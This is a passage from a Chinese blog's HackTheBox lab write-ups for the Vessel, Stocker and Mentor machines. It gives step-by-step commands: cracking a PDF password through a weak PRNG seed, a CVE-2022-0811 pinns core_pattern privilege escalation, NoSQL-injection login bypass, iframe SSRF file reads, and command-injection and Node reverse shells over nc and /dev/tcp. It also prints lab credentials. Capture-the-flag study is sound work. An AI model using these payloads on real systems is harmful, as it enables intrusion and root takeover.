= qrand() % len(charset) nchar = charset[idx] password += str(nchar) except: msg = QMessageBox() msg.setWindowTitle('Error') msg.setText('Error while generating password!, Send a message to the Author!') x = msg.exec_() return password 看到此函数恍然大悟，char=0就是ALL Characters，char=1是Alphabetic(字母)，char=2是Alphanumeric(字母数字)，那根据刚才看到的screenshot.png，合理推测第三行char=index=0，第二行length=value=32。根据password生成逻辑，charset有89个字符，每一位都从这89个字符中用qrand()随机一个，那么32位的password就有89的32次方种可能。但是qsrand(QTime.currentTime().msec())中的.msec()返回时间的毫秒部分，且范围是0-999，所以随机数种子只有1000种可能，可以爆破。 爆破脚本如下（由于Linux和Windows的python种Qt库可能不太一样，所以需在Windows下运行脚本，在Linux下运行会找不到pdf密码，而且passwordGenerator也是Windows程序） from PySide2.QtCore import qsrand, qrand def genPassword(ms: int) -&gt; str: length = 32 charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?' qsrand(ms) password = '' for i in range(length): idx = qrand() % len(charset) nchar = charset[idx] password += str(nchar) return password passwords = [genPassword(i) for i in range(1000)] with open('generated.txt', 'w') as f: f.write('\\n'.join(passwords)) 把刚生成的txt文件当作字典，用pdfcrack爆破，找到密码 ┌──(root💀kali)-[~/Desktop] └─# pdfcrack -f notes.pdf -w generated.txt PDF version 1.6 Security Handler: Standard V: 2 R: 3 P: -1028 Length: 128 Encrypted Metadata: True FileID: c19b3bb1183870f00d63a766a1f80e68 U: 4d57d29e7e0c562c9c6fa56491c4131900000000000000000000000000000000 O: cf30caf66ccc3eabfaf371623215bb8f004d7b8581d68691ca7b800345bc9a86 found user-password: 'YG7Q7RDzA+q&amp;ke~MJ8!yRzoI^VQxSqSS' 打开pdf文件如下 获得用户密码 Ethan b@mPRNSVTjjLKId1T ssh连上 用如下命令查询拥有suid权限的文件 ethan@vessel:~$ find / -perm -u=s -type f 2&gt;/dev/null /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/fusermount /usr/bin/passwd /usr/bin/gpasswd /usr/bin/sudo /usr/bin/umount /usr/bin/newgrp /usr/bin/chfn /usr/bin/at /usr/bin/chsh /usr/bin/mount /usr/bin/su /usr/bin/pinns 最后一个/usr/bin/pinns最可疑，google一下pinns exploit，看到如下文章 https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/ 七、CVE-2022-0811漏洞产生的应用是CRI-O（一个基于Kubernetes的实时容器引擎），漏洞名称叫cr8escape 在CRI-O版本1.19，pinns支持sysctl(system control)，即可以被用来设置内核参数值，而且不需要任何认证，命令格式如下 内核参数：https://docs.kernel.org/admin-guide/sysctl/kernel.html pinns -s kernel_parameter1=value1+kernel_parameter2=value2 其中kernel_parameter1和kernel_parameter2是两个参数名，两个赋值语句中间用“+”连接，pinns只检查kernel_parameter1以确保是一个安全的内核参数，kernel_parameter2可以被设置为任意的内核参数 用如下命令查看CRI-O版本是1.19.6，属于漏洞覆盖范围 ethan@vessel:~$ crio --version crio version 1.19.6 Version: 1.19.6 GitCommit: c12bb210e9888cf6160134c7e636ee952c45c05a GitTreeState: clean BuildDate: 2022-03-15T18:18:24Z GoVersion: go1.15.2 Compiler: gc Platform: linux/amd64 Linkmode: dynamic 参考上面crowdstrike的CVE分析文章，文章中用的内核参数是kernel.shm_rmid_forced和kernel.core_pattern kernel.shm_rmid_forced=1表示没有用户占用、且进程已被终止的共享内存段会被自动销毁 kernel.core_pattern的第一个字符如果是“|”，那么后面的字符串就会当作命令被执行 此处有个概念：内核转储（coredump），在进程发生问题时保存进程的运行状态 参考：https://www.jianshu.com/p/191a62f4f6b9?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation 盘一盘逻辑：某一进程发生问题→触发内核转储→内核转储会根据kernel.core_pattern的设置确定存储信息的文件→kernel.core_pattern第一个字符“|”后的字符串会当作命令被执行 中间的部分操作系统自动处理不用管，只需要操作第一步和最后一步，即想办法让某一进程出问题，并且预先设置好kernel.core_pattern的值，便于执行命令 让某一进程出问题：可以用kill进程的方式实现 预先设置kernel.core_pattern的值：此处是pinns提供了修改内核参数的功能，所以用pinns去设置，格式如下 pinns -s kernel_parameter1=value1+kernel_parameter2=value2 注：保证kernel_parameter1=value1是合法赋值，kernel_parameter2位置是kernel.core_pattern，value2位置是“|”开头，后面跟想要执行的命令或者脚本文件 于是用构造如下命令 pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/exp.sh #' 先查看想要修改的两个文件 ethan@vessel:~$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced |/usr/share/apport/apport %p %s %c %d %P %E 0 执行构造好的命令，发现如下报错，并且查看目标文件，没有变化 ethan@vessel:~$ pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/exp.sh #' [pinns:e]: Path for pinning namespaces not specified: Invalid argument 查看pinnx源码，发现报错的原因 pinns源码：https://github.com/cri-o/cri-o/blob/v1.19.1/pinns/src/pinns.c 发现如下两个逻辑代码段 static const struct option long_options[] = { {\"help\", no_argument, NULL, 'h'}, {\"uts\", optional_argument, NULL, 'u'}, {\"ipc\", optional_argument, NULL, 'i'}, {\"net\", optional_argument, NULL, 'n'}, {\"user\", optional_argument, NULL, 'U'}, {\"cgroup\", optional_argument, NULL, 'c'}, {\"dir\", required_argument, NULL, 'd'}, {\"filename\", required_argument, NULL, 'f'}, {\"sysctl\", optional_argument, NULL, 's'}, }; if (!pin_path) { pexit(\"Path for pinning namespaces not specified\"); } if (!filename) { pexit(\"Filename for pinning namespaces not specified\"); } if (directory_exists_or_create(pin_path) &lt; 0) { nexitf(\"%s exists but is not a directory\", pin_path); } if (num_unshares == 0) { nexit(\"No namespace specified for pinning\"); } if (unshare(unshare_flags) &lt; 0) { pexit(\"Failed to unshare namespaces\"); } 结合全部代码分析，整体要求就是： 1.要有-d参数，且参数值指定目录要存在或者可以被创建； 2.要有-f参数，参数值任意，但不能为空； 3.-u -i -n -U四个参数至少有一个（此处笔者只试了一个-U，理论上保证num_unshares不为0即可）。 重新构造，执行如下命令 ethan@vessel:~$ pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/dev/shm/exp.sh #' -f file -d /dev/shm -U [pinns:e]: Failed to bind mount ns: /proc/self/ns/user: Operation not permitted 虽有报错，但不影响，再次查看目标文件内容，修改成功 ethan@vessel:~$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced |/dev/shm/exp.sh # 1 向/dev/shm/exp.sh写入想要执行的代码（此处就是把/bin/bash复制到/tmp/wa0er，并给予4755权限，也就是suid和755权限），并给/dev/shm/exp.sh添加执行权限 ethan@vessel:~$ echo -e '#!/bin/bash\\ncp /bin/bash /tmp/wa0er\\nchown root:root /tmp/wa0er\\nchmod 4755 /tmp/wa0er' | tee /dev/shm/exp.sh #!/bin/bash cp /bin/bash /tmp/wa0er chown root:root /tmp/wa0er chmod 4755 /tmp/wa0er ethan@vessel:~$ chmod +x /dev/shm/exp.sh 执行sleep命令，并用killall终止进程，-s SIGSEGV表示访问未分配给自己的内存，此处可看到回显(core dumped)，即进入内核转储 ethan@vessel:~$ sleep 100&amp; [1] 1676 ethan@vessel:~$ killall -s SIGSEGV sleep [1]+ Segmentation fault (core dumped) sleep 100 查看/tmp/wa0er文件权限，已有suid权限 ethan@vessel:~$ ls -l /tmp/wa0er -rwsr-xr-x 1 root root 1183448 Mar 27 13:07 /tmp/wa0er 执行/tmp/wa0er -p提权，成功获取root权限 Over！ 参考https://blog.csdn.net/qq_45894840/article/details/127844085 https://0xdf.gitlab.io/2023/03/25/htb-vessel.html","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Stocker","slug":"HTB5-Stocker","date":"2023-03-22T12:47:00.000Z","updated":"2023-08-31T07:56:00.151Z","comments":true,"path":"posts/77989ccd.html","link":"","permalink":"https://wa0er.github.io/posts/77989ccd.html","excerpt":"","text":"HTB-Stocker信息收集nmap ┌──(root💀kali)-[~/桌面] └─# nmap -sC -sV -oA stocker 10.10.11.196 Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-06 22:42 EST Nmap scan report for stocker.htb (10.10.11.196) Host is up (0.15s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA) | 256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA) |_ 256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-generator: Eleventy v2.0.0 |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Stock - Coming Soon! Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.11 seconds 开放端口：22（ssh）、80（http），域名：stocker.htb 添加域名到本地hosts文件 ┌──(root💀kali)-[~/桌面] └─# echo \"10.10.11.196 stocker.htb\" &gt;&gt; /etc/hosts 访问stocker.htb（注：若kali科学上网方案采用的是通过proxychains代理到物理机，则此处用proxychains打开的firefox来访问stocker.htb会打不开。因为此时HTTP请求流量会被代理到物理机，而不走HTB官方给的VPN通道。至于为什么代理到物理机就打不开，相关具体细节可以通过Wireshark结合计算机网络知识分析） 用gobuster爆一下子域名 ┌──(root💀kali)-[~/Desktop] └─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://stocker.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt [+] User Agent: gobuster/3.5 [+] Timeout: 10s [+] Append Domain: true =============================================================== 2023/03/14 21:37:39 Starting gobuster in VHOST enumeration mode =============================================================== Found: dev.stocker.htb Status: 302 [Size: 28] [--&gt; /login] Progress: 4968 / 4990 (99.56%) =============================================================== 2023/03/14 21:38:08 Finished =============================================================== 有个dev.stocker.htb子域，302重定向到/login目录，同样添加到hosts文件 ┌──(root💀kali)-[~/桌面] └─# echo \"10.10.11.196 dev.stocker.htb\" &gt;&gt; /etc/hosts 访问，确实是个登录页面 用Wappalyzer插件看到网站是Nodejs写的 NoSQL注入NoSQL：https://www.mongodb.com/zh-cn/nosql-explained 一般而言，NoSQL数据库是对非关系型数据库的统称，是个广义概念。常见NoSQL数据库，如MongoDB（文档数据库）、Redis（键值数据库）、Cassandra（宽列存储数据库）、JanusGraph（图形数据库）等。 随便输入一组用户名密码登录，并用Burp抓包，重放 返回登录失败的报错 修改Content-Type值为application/json，修改请求包数据部分如下 {\"username\":{\"$ne\":\"admin\"}, \"password\":{\"$ne\":\"admin\"}} 可看到302重定向到/stock目录，浏览器打开此目录，发现成功登录 SSRF页面下拉，随便选一个商品，此处选了一个杯子，添加到购物车，然后查看购物车，点击提交购买，同时用Burp抓取请求包 可看到当前目录是在/api/order，Burp重放请求包之后，可看到返回一个orderId 回到浏览器，取消Burp代理抓包，有如下弹窗，点击here跳转 发现页面跳转到/api/po/[OrderID]，是个PDF 在尝试后，发现修改title字段值，页面中的Item条目会相应变成title字段值（每次在Burp修改title字段值，然后重放请求包后，把返回的OrderID值复制粘贴到URL栏末尾即可访问） 参考 https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file https://techkranti.com/ssrf-aws-metadata-leakage/ 于是修改title字段值如下，尝试读取etc/passwd文件 &lt;iframe src=/etc/passwd&gt;&lt;/iframe&gt; Item条目显示出/etc/passwd内容，但不是很全 那就尝试把宽高设大一些，再次读取，发现能看到的部分就多了 &lt;iframe src=/etc/passwd height=500 width=500&gt;&lt;/iframe&gt; 读取nginx默认配置 &lt;iframe src=file:///etc/nginx/nginx.conf height=1100px width=1100px&lt;/iframe&gt; 发现网站根目录在/var/www/dev，那就尝试读取index.js配置文件 &lt;iframe src=file:///var/www/dev/index.js height=1000px width=1000px&gt;&lt;/iframe&gt; 通过前面/etc/passwd，知道有两个普通用户，mongdb和angoose，配置文件中有一个疑似密码的字符串 尝试之后，发现SSH用户密码如下 Angoose IHeardPassphrasesArePrettySecure ┌──(root💀kali)-[~/Desktop] └─# ssh angoose@10.10.11.196 The authenticity of host '10.10.11.196 (10.10.11.196)' can't be established. ECDSA key fingerprint is SHA256:DX/9+PB1w20dghcXwm9QPFH88qM0aiPr+RyA+wzHnng. Are you sure you want to continue connecting (yes/no/[fingerprint])? y Please type 'yes', 'no' or the fingerprint: yes Warning: Permanently added '10.10.11.196' (ECDSA) to the list of known hosts. angoose@10.10.11.196's password: Last login: Tue Mar 14 22:45:53 2023 from 10.10.14.187 angoose@stocker:~$ id uid=1001(angoose) gid=1001(angoose) groups=1001(angoose) angoose@stocker:~$ pwd /home/angoose 权限提升sudo -l查看angoose用户权限 angoose@stocker:~$ sudo -l [sudo] password for angoose: Matching Defaults entries for angoose on stocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User angoose may run the following commands on stocker: (ALL) /usr/bin/node /usr/local/scripts/*.js 发现angoose用户可执行/usr/bin/node /usr/local/scripts/*.js 那我们就尝试在/usr/local/scripts目录下写一个js文件，但发现在此目录无可写权限，那就依然在angoose用户的home目录下写wa0er_rev.js，内容是反弹shell，如下 angoose@stocker:~$ vi wa0er_rev.js require('child_process').exec(\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.x.x/9898 0&gt;&amp;1'\") 开启nc监听 nc -nvlp 9898 执行，刚刚的反弹shell文件 angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/wa0er_rev.js [sudo] password for angoose: 成功获取root权限 Over！ 总结 信息收集发现登录点，尝试发现登录点存在NoSQL注入； NoSQL注入绕过登录验证； 提交购物信息发现有PDF存在SSRF； SSRF读取敏感文件发现SSH用户； sudo -l发现SSH用户有执行文件权限； 执行文件反弹shell，获取root权限。 参考HackTheBox Stocker：https://infosecwriteups.com/stocker-hackthebox-machine-simple-writeup-2023-316497ed30f7 HackTheBox Stocker：https://blog.csdn.net/qq_45894840/article/details/128765294","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Mentor","slug":"HTB4-Mentor","date":"2023-03-18T06:04:00.000Z","updated":"2023-08-31T07:55:40.849Z","comments":true,"path":"posts/b2f064df.html","link":"","permalink":"https://wa0er.github.io/posts/b2f064df.html","excerpt":"","text":"HTB-Mentor信息收集nmap ┌──(root💀kali)-[~/Desktop] └─# nmap -sC -sV -oA nmap/result 10.10.11.193 Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-05 19:47 EST Nmap scan report for 10.10.11.193 Host is up (0.38s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA) |_ 256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://mentorquotes.htb/ Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 74.40 seconds 开放端口：22（SSH）、80（HTTP），域名http://mentorquotes.htb/ 添加域名到本地hosts文件 echo \"10.10.11.193 mentorquotes.htb\" &gt;&gt; /etc/hosts URL访问http://mentorquotes.htb/ wfuzz一下子域 ┌──(root💀kali)-[~/Desktop] └─# wfuzz -H \"Host: FUZZ.mentorquotes.htb\" --hc 302,400 -t 50 -H \"User-Agent: wa0er\" -c -z file,\"/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt\" http://mentorquotes.htb/ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://mentorquotes.htb/ Total requests: 38267 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000142: 404 0 L 2 W 22 Ch \"api\" Total time: 0 Processed Requests: 38267 Filtered Requests: 38266 Requests/sec.: 0 得api子域，将api子域添加进本地hosts文件 echo \"10.10.11.193 api.mentorquotes.htb\" &gt;&gt; /etc/hosts 访问api.mentorquotes.htb，是404 ffuf爆破一下api.mentorquotes.htb的目录 ┌──(root💀kali)-[~/Desktop] └─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://api.mentorquotes.htb/FUZZ -t 50 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://api.mentorquotes.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 292ms] * FUZZ: admin [Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 533ms] * FUZZ: docs [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 362ms] * FUZZ: users [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 1082ms] * FUZZ: quotes [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 863ms] * FUZZ: server-status :: Progress: [38267/38267] :: Job [1/1] :: 125 req/sec :: Duration: [0:04:47] :: Errors: 0 :: 得到api.mentorquotes.htb四个目录：/admin、/docs、/users、/quotes、/server-status api.mentorquotes.htb/admin如下 api.mentorquotes.htb/docs如下，用的Swagger UI，页面能看到很多API 可以看到这个站点的站主是james，并且他的邮箱是james@mentorquotes.htb 在/auth/signup尝试注册账户，如下界面，填写email、username、password，点击Execute，同时Burp抓包 Burp抓包重放，如下，可看到账户已被创建 尝试用刚创建的账户在/auth/login登录，填写email、username、password，点击Execute，依然Burp抓包 Burp重放，发现返回了一串JWT（JsonWebToken，下简称JWT，JWT典型的三段结构：xxx.xxx.xxx） \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoid2EwZXJAZXhhbXBsZS5jb20ifQ.HfrTNgZInwCjDjfhO447ojuw5lEZWi03NmrENknZJZ8\" /users目录应该是所有用户的信息，于是在/users目录尝试登录，如果直接登录，会发现提示需要Authorization字段，那我们就抓包在请求头添加如下Authorization键值对，重放HTTP请求，发现提示只允许admin用户访问 Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoid2EwZXJAZXhhbXBsZS5jb20ifQ.HfrTNgZInwCjDjfhO447ojuw5lEZWi03NmrENknZJZ8 然后尝试用james用户的邮箱用户名去注册，发现会提示用户已存在 随后进行百般尝试，发现它验证用户是否已存在的逻辑是：当email和username同时匹配到相同的值时，才会认定此用户已存在。于是尝试伪造管理员用户获取管理员JWT（这里的管理员用户推测应该是站主james或者admin）。 但随后用注册→登录（获取JWT）→/users目录尝试了以下5种组合，均提示只有admin用户能访问该资源 { \"email\":\"james@mentorquotes.htb\", \"username\":\"wa0er\", \"password\":\"wa0erwa0er\" } { \"email\":\"wa0er@mentorquotes.htb\", \"username\":\"james\", \"password\":\"wa0erwa0er\" } { \"email\":\"admin@mentorquotes.htb\", \"username\":\"admin\", \"password\":\"wa0erwa0er\" } { \"email\":\"admin@mentorquotes.htb\", \"username\":\"wa0er\", \"password\":\"wa0erwa0er\" } { \"email\":\"wa0er@mentorquotes.htb\", \"username\":\"admin\", \"password\":\"wa0erwa0er\" } 随后整理思路，在一次nmap扫描中，看到如下信息 ┌──(root💀kali)-[~/Desktop] └─# nmap -sU 10.10.11.193 Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-11 21:40 EST Nmap scan report for mentorquotes.htb (10.10.11.193) Host is up (0.23s latency). Not shown: 998 closed ports PORT STATE SERVICE 68/udp open|filtered dhcpc 161/udp open|filtered snmp Nmap done: 1 IP address (1 host up) scanned in 1031.83 seconds 68端口（DHCPC）和161端口（SNMP）开放，DHCP可能的攻击主要就是拒绝服务和中间人攻击，用不上，那就从SNMP下手。 SNMP全称简单网络管理协议，是专门设计用于在IP网络管理网络节点（服务器、工作站、路由器、交换机及HUBS等）的一种标准协议，是一种应用层协议。通过SNMP可以访问设备信息、改写和配置设备参数等，SNMP运行在UDP161端口上，采用UDP协议在管理端和agent之间传输信息。 试试用snmpbulkwalk读取相关配置信息 https://linux.die.net/man/1/snmpbulkwalk snmpbulkwalk -c internal -v2c 10.10.11.193 &gt; snmpbulk_mentor 注： -v 1|2c|3 指定SNMP版本 -c COMMUNITY 指定community string -m MIB[:...] 指定MIB文件（此处没用到） 查看刚读取的配置信息，搜索带有login字符串的条目，发现/usr/local/bin/login.py有一个字符串kj23sadkj123as0-d213，可能是管理员的登录密码 cat snmpbulk mentor | grep login 我们到/auth/login目录，用james的邮箱和用户名，密码填写刚获得的密码，成功登录，获取到james账户JWT \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0\" Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0 命令执行访问/users/目录，成功拿到用户列表，主要是两个用户：james和service_acc 刚才我们爆破出了/admin目录，我们重新用这个JWT访问此目录，发现有两个功能目录 \"admin_funcs\":{ \"check db connection\":\"/check\", \"backup the application\":\"/backup\" 访问/admin/check，返回Not implemented yet! 访问/admin/backup，返回Method Not Allowed 在请求头区域单击鼠标右键，选择Change request method，自动切换成POST方法，点击send发送数据包后， 可看到响应包content-type值为application/json，再加上数据部分的报错，意思就是请求包需要有带body属性的json对象 修改content-type值为application/json，请求头内容添加json对象，body为空就行，又提示需要path属性 于是在请求头内容添加body属性和path属性，返回Done!，嗯？？？，Done了个寂寞，应该是代入执行了 那我们就尝试执行命令，修改body如下，也就是ping本地主机（务必记得末尾加分号！） 在发送请求包前在本地开启tcpdump捕获数据包 tcpdump -i tun0 icmp #只捕获tun0网卡的icmp协议数据包 发送请求包后，可在本地看到有数据包被捕获，说明命令被成功执行 那就构造如下请求包，本地开启nc监听 nc -nvlp 9898 POST /admin/backup HTTP/1.1 Host: api.mentorquotes.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0 Accept: application/json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://api.mentorquotes.htb/docs Connection: close Content-Type: application/json Content-Length: 108 { \"body\": \"wa0er\", \"path\":\"/;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.X.X 9898 &gt;/tmp/f;\" } 成功反弹shell，获取到root权限，但看到nc提示sh: can't access tty; job control turned off，这说明根本就没有进到控制终端，可能是个虚拟环境之类的，尝试读取/root/root.txt文件发现确实没有，所以还要进一步getshell /app/app目录下有db.py db.py内容如下 import os from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData) from sqlalchemy.sql import func from databases import Database # Database url if none is passed the default one is used DATABASE_URL = os.getenv(\"DATABASE_URL\", \"postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\") # SQLAlchemy for quotes engine = create_engine(DATABASE_URL) metadata = MetaData() quotes = Table( \"quotes\", metadata, Column(\"id\", Integer, primary_key=True), Column(\"title\", String(50)), Column(\"description\", String(50)), Column(\"created_date\", DateTime, default=func.now(), nullable=False) ) # SQLAlchemy for users engine = create_engine(DATABASE_URL) metadata = MetaData() users = Table( \"users\", metadata, Column(\"id\", Integer, primary_key=True), Column(\"email\", String(50)), Column(\"username\", String(50)), Column(\"password\", String(128) ,nullable=False) ) # Databases query builder database = Database(DATABASE_URL) 为了与PostgreSQL数据库交互，需要用到chisel工具 chisel工具：https://github.com/jpillora/chisel 从本地传一个chisel 本地：python3 -m http.server 80 靶机：wget http://[本地IP]/chisel （PS：这里看到靶机IP为10.129.89.191，与之前的10.10.11.193不一致，是因为靶机中间网络中断，我切换过靶机环境，本质上他俩都是这台靶机地址） 将chisel复制到/tmp文件夹下，并添加可执行权限 本地执行： chmod +x chisel ./chisel server --port 9899 --reverse 靶机执行： chmod +x chisel ./chisel client -v 10.10.X.X:9899 R:5432:172.22.0.1:5432 连接数据库，密码是postgres ┌──(root💀kali)-[~/Desktop] └─# psql -h 10.10.X.X -U \"postgres\" -p 5432 Password for user postgres: psql (13.2 (Debian 13.2-1), server 13.7 (Debian 13.7-1.pgdg110+1)) Type \"help\" for help. postgres=# \\list List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------------+----------+----------+------------+------------+----------------------- mentorquotes_db | postgres | UTF8 | en_US.utf8 | en_US.utf8 | postgres | postgres | UTF8 | en_US.utf8 | en_US.utf8 | template0 | postgres | UTF8 | en_US.utf8 | en_US.utf8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.utf8 | en_US.utf8 | =c/postgres + | | | | | postgres=CTc/postgres (4 rows) postgres=# \\c mentorquotes_db psql (13.2 (Debian 13.2-1), server 13.7 (Debian 13.7-1.pgdg110+1)) You are now connected to database \"mentorquotes_db\" as user \"postgres\". mentorquotes_db=# \\d List of relations Schema | Name | Type | Owner --------+---------------+----------+---------- public | cmd_exec | table | postgres public | quotes | table | postgres public | quotes_id_seq | sequence | postgres public | users | table | postgres public | users_id_seq | sequence | postgres (5 rows) mentorquotes_db=# select * from users; id | email | username | password ----+------------------------+-------------+---------------------------------- 1 | james@mentorquotes.htb | james | 7ccdcd8c05b59add9c198d492b36a503 2 | svc@mentorquotes.htb | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8 4 | wa0er@mentorquotes.htb | james | ad4ece449e52f57769466a281720b825 5 | james@mentorquotes.htb | wa0er | ad4ece449e52f57769466a281720b825 6 | admin@mentorquotes.htb | admin | ad4ece449e52f57769466a281720b825 (5 rows) 获取到用户密码hash值，只有前两个有用，后面的是之前自己添加的 破解一下https://crackstation.net/ 得到svc账户的密码 123meunomeeivani 登录ssh ┌──(root💀kali)-[~/Desktop] └─# ssh svc@10.10.11.193 svc@10.10.11.193's password: Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Mar 9 09:03:14 AM UTC 2023 System load: 0.0 Usage of /: 65.3% of 8.09GB Memory usage: 15% Swap usage: 0% Processes: 243 Users logged in: 0 IPv4 address for br-028c7a43f929: 172.20.0.1 IPv4 address for br-24ddaa1f3b47: 172.19.0.1 IPv4 address for br-3d63c18e314d: 172.21.0.1 IPv4 address for br-7d5c72654da7: 172.22.0.1 IPv4 address for br-a8a89c3bf6ff: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.11.193 IPv6 address for eth0: dead:beef::250:56ff:feb9:d789 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40 svc@mentor:~$ id uid=1001(svc) gid=1001(svc) groups=1001(svc) svc@mentor:~$ pwd /home/svc 权限提升从本地传一个linpeas工具，运行一下，分析可看到有SNMP服务的相关配置文件 